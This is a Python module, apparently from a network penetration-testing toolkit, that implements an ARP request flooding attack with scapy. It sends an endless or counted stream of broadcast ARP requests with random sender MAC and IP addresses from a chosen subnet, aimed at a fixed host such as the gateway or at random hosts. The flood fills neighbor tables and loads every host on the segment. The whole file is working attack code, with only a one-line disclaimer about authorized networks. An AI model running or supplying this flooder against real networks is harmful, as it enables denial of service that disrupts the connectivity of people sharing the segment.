"""ARP request flooding: broadcast a stream of ARP requests with varying senders.

Each request carries a random unicast sender MAC and a random sender IP from the
chosen subnet. The target is either a fixed IP (for example the gateway) or a
random host of the subnet. Every host on the segment has to process each
broadcast, and a host that owns the target IP answers each sender, which fills
its neighbor (ARP) table.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import ARP, Ether, sendp
from scapy.packet import Packet

from macabre.attacks.arp_spoofing import parse_ipv4
from macabre.attacks.common import BROADCAST_MAC, random_mac

ZERO_MAC = "00:00:00:00:00:00"
ARP_REQUEST = 1


@dataclass(frozen=True)
class ArpRequestFloodingConfig:
    iface: str                  # attacker interface, on the segment
    subnet: str                 # CIDR the random senders (and random targets) come from
    target_ip: str = ""         # fixed IP to ask for; empty = random host of the subnet
    count: int = 0              # requests to send; 0 = run until stopped
    interval: float = 0.0       # seconds between requests
    dry_run: bool = False       # build requests but do not send them

    def __post_init__(self) -> None:
        network = _subnet(self.subnet)
        if network.num_addresses < 4:
            raise ValueError("The subnet needs at least two usable hosts.")
        if self.target_ip.strip():
            parse_ipv4(self.target_ip, "target IP")


def _subnet(value: str) -> ipaddress.IPv4Network:
    text = value.strip()
    if not text:
        raise ValueError("Subnet is required, for example 192.168.1.0/24.")
    try:
        return ipaddress.IPv4Network(text, strict=False)
    except ValueError:
        raise ValueError(f"Invalid subnet: {value}") from None


@dataclass
class ArpRequestFloodingStats:
    frames: int = 0


def build_arp_request(sender_mac: str, sender_ip: str, target_ip: str) -> Packet:
    """Broadcast ARP request: `sender_ip` at `sender_mac` asks who has `target_ip`."""
    return Ether(src=sender_mac, dst=BROADCAST_MAC) / ARP(
        op=ARP_REQUEST,
        hwsrc=sender_mac,
        psrc=sender_ip,
        hwdst=ZERO_MAC,
        pdst=target_ip,
    )


def _random_host(network: ipaddress.IPv4Network, rng: random.Random) -> str:
    low = int(network.network_address) + 1
    high = int(network.broadcast_address) - 1
    return str(ipaddress.IPv4Address(rng.randint(low, high)))


def run_arp_request_flooding(
    config: ArpRequestFloodingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[ArpRequestFloodingStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> ArpRequestFloodingStats:
    """Send ARP requests with random senders until `count` or `stop_event`."""
    rng = rng or random.Random()
    send = send or sendp
    network = _subnet(config.subnet)
    fixed_target = parse_ipv4(config.target_ip, "target IP") if config.target_ip.strip() else ""
    stats = ArpRequestFloodingStats()
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        frame = build_arp_request(
            random_mac(rng),
            _random_host(network, rng),
            fixed_target or _random_host(network, rng),
        )
        if not config.dry_run:
            send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
